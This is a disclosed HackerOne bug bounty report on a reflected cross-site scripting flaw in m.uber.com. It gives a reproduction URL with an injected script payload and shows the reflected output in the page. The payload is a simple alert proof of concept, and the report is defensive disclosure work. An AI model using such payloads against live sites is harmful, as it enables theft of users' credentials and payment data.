# SSL-protected Reflected XSS in m.uber.com

## Report Details
- **Report ID**: 296701
- **URL**: https://hackerone.com/reports/296701
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-12-10T18:06:43.055Z
- **Disclosed**: 2017-12-26T11:03:42.453Z

## Reporter
- **Username**: gregoryvperry
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
## Summary
m.uber.com is susceptible to reflected XSS

## Security Impact
A malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com

## Reproduction Steps
https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1

## Specifics
From the rendered web page:
```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
```
No further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser's XSS _Auditor protections.

## Impact

An attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.

## Attachments
No attachments
